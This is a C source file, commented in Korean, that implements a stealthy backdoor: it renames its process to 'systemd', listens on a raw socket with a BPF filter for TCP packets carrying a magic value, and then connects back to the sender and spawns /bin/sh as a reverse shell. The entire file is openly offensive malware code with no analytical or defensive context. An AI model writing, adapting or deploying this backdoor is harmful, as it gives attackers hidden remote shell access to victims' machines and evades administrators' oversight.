#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/filter.h>
#include <sys/prctl.h>

#define MAGIC_PORT 4444               // 공격자가 사용할 매직 포트
#define MAGIC_VALUE 0xdeadbeef        // 매직 패킷을 식별하기 위한 고유 값

// 수신한 패킷이 매직 값을 포함하는지 검사
int check_magic(const char *buffer) {
    uint32_t *ptr = (uint32_t *)(buffer + 40);  // TCP payload 오프셋 (단순화된 가정)
    return (*ptr == htonl(MAGIC_VALUE));        // 매직 값 비교 (네트워크 바이트 순서)
}

// 공격자와 연결 후 /bin/sh 실행 (리버스 셸)
void handle_command(struct sockaddr_in *src) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);                          // TCP 소켓 생성
    connect(sock, (struct sockaddr *)src, sizeof(*src));                // 공격자의 주소로 연결 시도

    dup2(sock, 0);  // stdin 리디렉션
    dup2(sock, 1);  // stdout 리디렉션
    dup2(sock, 2);  // stderr 리디렉션

    char *args[] = {"/bin/sh", NULL};                                   // 쉘 실행 인자 설정
    execve("/bin/sh", args, NULL);                                      // 쉘 실행
}

int main() {
    prctl(PR_SET_NAME, "systemd", 0, 0, 0);                             // 프로세스 이름을 "systemd"로 위장

    int sock_raw = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);              // RAW 소켓 생성 (TCP 감청용)

    // BPF 필터 정의 (예시): TCP 프로토콜만 허용
    struct sock_filter filter_code[] = {
        { 0x30, 0, 0, 0x00000009 },       // LDB [9]: IP 헤더의 9번째 바이트 (프로토콜) 읽기
        { 0x15, 0, 1, 0x00000006 },       // JEQ #IPPROTO_TCP: TCP 패킷인지 비교
        { 0x6,  0, 0, 0x0000ffff },       // RET #65535: 통과 허용 (전체 패킷 수신)
        { 0x6,  0, 0, 0x00000000 },       // RET #0: 필터에 통과 못 하면 드롭
    };

    // BPF 프로그램 설정
    struct sock_fprog bpf_program = {
        .len = sizeof(filter_code)/sizeof(struct sock_filter),          // 필터 개수
        .filter = filter_code,                                          // 필터 포인터
    };

    // RAW 소켓에 BPF 필터 부착
    setsockopt(sock_raw, SOL_SOCKET, SO_ATTACH_FILTER, &bpf_program, sizeof(bpf_program));

    char buffer[4096];                                                  // 수신 버퍼
    struct sockaddr_in src;                                             // 소스 주소 저장용
    socklen_t slen = sizeof(src);

    while (1) {
        // RAW 소켓으로 TCP 패킷 수신
        ssize_t len = recvfrom(sock_raw, buffer, sizeof(buffer), 0, (struct sockaddr *)&src, &slen);

        // 매직 값이 포함된 패킷이면 공격자에게 연결
        if (len > 0 && check_magic(buffer)) {
            handle_command(&src);
        }
    }

    return 0;
}
